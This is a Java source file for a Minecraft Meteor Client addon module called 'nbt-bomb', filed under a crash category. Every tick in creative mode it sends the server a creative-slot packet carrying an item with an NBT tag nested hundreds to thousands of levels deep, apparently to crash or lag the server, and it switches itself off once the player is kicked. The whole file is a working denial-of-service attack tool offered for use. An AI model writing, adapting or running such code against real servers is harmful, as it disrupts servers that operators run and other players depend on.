package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class NbtBomb extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> depth = sgGeneral.add(new IntSetting.Builder()
        .name("depth").description("Nesting levels in the NbtCompound tree.")
        .defaultValue(512).range(1, 4096).sliderRange(1, 1024).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public NbtBomb() {
        super(AddonTemplate.CRASH_CATEGORY, "nbt-bomb",
            "Sends a deeply-nested NBT tag via creative slot packet. Requires creative mode.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || !mc.player.getAbilities().creativeMode) return;
        NbtCompound root = buildNestedTag(depth.get());
        ItemStack stack = new ItemStack(Items.STONE);
        stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(root));
        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, stack));
    }

    private static NbtCompound buildNestedTag(int levels) {
        NbtCompound current = new NbtCompound();
        for (int i = 0; i < levels; i++) {
            NbtCompound parent = new NbtCompound();
            parent.put("n", current);
            current = parent;
        }
        return current;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
